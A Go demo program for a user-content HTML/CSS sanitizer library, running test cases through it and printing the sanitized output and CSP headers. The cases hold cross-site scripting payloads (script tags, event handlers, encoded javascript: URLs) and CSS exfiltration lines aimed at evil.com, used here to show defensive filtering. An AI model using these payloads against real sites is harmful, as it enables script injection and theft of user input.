// Demo program: shows how to use the sanitizer directly.
// Run with: go run ./cmd/demo
package main

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/gobeaver/go-beaver-tag-sanitization/usercontent"
	"github.com/gobeaver/go-beaver-tag-sanitization/usercontent/profiles"
)

func main() {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		fmt.Fprintln(os.Stderr, "init:", err)
		os.Exit(1)
	}

	cases := []struct {
		name, html, css string
	}{
		{"plain", "<h1>Hello</h1><p>World</p>", "h1{color:red}"},
		{"script-tag", "<p>Hi</p><script>alert(1)</script>", ""},
		{"javascript-url", `<a href="javascript:alert(1)">click</a>`, ""},
		{"event-handler", `<img src=x onerror="alert(1)">`, ""},
		{"iframe", `<p>before</p><iframe src="https://evil.com"></iframe>`, ""},
		{"svg-onload", `<svg onload="alert(1)"></svg>`, ""},
		{"form", `<form action="https://evil.com"><input name="x"></form>`, ""},
		{"meta-refresh", `<meta http-equiv="refresh" content="0;url=evil">`, ""},
		{"base-hijack", `<base href="https://evil.com">`, ""},
		{"encoding-trick", `<a href="&#106;avascript:alert(1)">x</a>`, ""},
		{"css-import", `<p>Hi</p>`, `@import url("https://evil.com/x.css");`},
		{"css-expression", `<p>Hi</p>`, `p{width: expression(alert(1))}`},
		{"css-exfil", `<p>Hi</p>`, `input[value^="a"]{background:url("https://evil.com/?c=a")}`},
		{"external-img", `<img src="https://evil.com/x.png">`, ""},
		{"data-jpeg", `<img src="data:image/jpeg;base64,AAAA" alt="x">`, ""},
		{"all-good",
			`<section>` +
				`<h1>Welcome</h1>` +
				`<p>This page uses <strong>semantic</strong> structure and clean typography.</p>` +
				`<p>Visit our <a href="/about">about page</a> for more.</p>` +
				`</section>`,
			`section { padding: 2rem; max-width: 48rem; margin: 0 auto; font-family: system-ui, sans-serif; line-height: 1.6; }` +
				`h1 { color: #333; font-size: 2rem; margin: 0 0 1rem; }` +
				`p  { margin: 0 0 1rem; }` +
				`a  { color: #06f; }`,
		},
	}

	fmt.Println("=== USERCONTENT SANITIZER DEMO ===")
	for _, c := range cases {
		html, report, err := s.SanitizeHTML(c.html)
		if err != nil {
			fmt.Printf("[%s] %v\n", c.name, err)
			continue
		}
		css, cssReport, err := s.SanitizeCSS(c.css)
		if err != nil {
			fmt.Printf("[%s] css: %v\n", c.name, err)
			continue
		}
		status := "ok"
		if report.Modified || cssReport.Modified {
			status = "MODIFIED"
		}
		fmt.Printf("[%s] %s\n", c.name, status)
		fmt.Printf("  html: %s\n", jsonString(html))
		fmt.Printf("  css:  %s\n", jsonString(css))
		if report.Modified {
			fmt.Printf("  removed: %d html item(s)\n", len(report.Removed))
		}
		if cssReport.Modified {
			fmt.Printf("  removed: %d css item(s)\n", len(cssReport.Removed))
		}
		fmt.Println()
	}

	fmt.Println("=== CSP HEADERS ===")
	for k, v := range s.CSPHeaders() {
		fmt.Printf("%s: %s\n", k, v)
	}
}

func jsonString(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}
